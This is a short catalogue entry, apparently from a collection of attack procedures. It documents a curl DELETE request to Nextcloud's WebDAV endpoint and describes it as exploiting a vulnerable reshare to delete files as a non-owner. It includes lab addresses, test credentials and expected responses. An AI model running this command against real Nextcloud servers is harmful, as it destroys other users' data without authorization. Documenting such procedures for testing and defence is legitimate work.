---
data: >-
  curl --user user2:user2
  "http://172.17.0.1:8081/remote.php/dav/files/user2/test/file.txt" -H
  "OCS-APIRequest: true" -X DELETE
tags:
  - nextcloud
  - dav
  - deletion
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:19.900Z'
id: 867d5db0-e7ab-4acb-b132-7954255de4f8
verified: false
validated: true
submitted: true
---
# nextcloud-delete-file-via-dav

## Command

```bash
curl --user user2:user2 "http://172.17.0.1:8081/remote.php/dav/files/user2/test/file.txt" -H "OCS-APIRequest: true" -X DELETE
```

## Description

This command deletes a file in Nextcloud via the WebDAV endpoint, exploiting elevated permissions from a vulnerable reshare to perform unauthorized deletion as a non-owner user.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--user` | Basic auth credentials for the deleting user | Yes |
| URL | WebDAV path: /remote.php/dav/files/{user}/{path/to/file} | Yes |
| `-H` | OCS-APIRequest header (optional for DAV, but used for consistency) | No |
| `-X DELETE` | HTTP method for deletion | Yes |

## Examples

### Basic Usage

```bash
curl --user user2:user2 "http://nextcloud.example.com/remote.php/dav/files/user2/test/file.txt" -X DELETE
```

### Advanced Usage

With verbose output: `-v` to see response details.

```bash
curl -v --user user2:user2 "http://172.17.0.1:8081/remote.php/dav/files/user2/test/file.txt" -X DELETE
```

## Expected Output

HTTP 204 No Content response with no body, indicating successful deletion. Errors return 403 or 404 if permissions fail.

## Related

- [[Related Procedure: Nextcloud-Delete-File-via-Unauthorized-Access]]
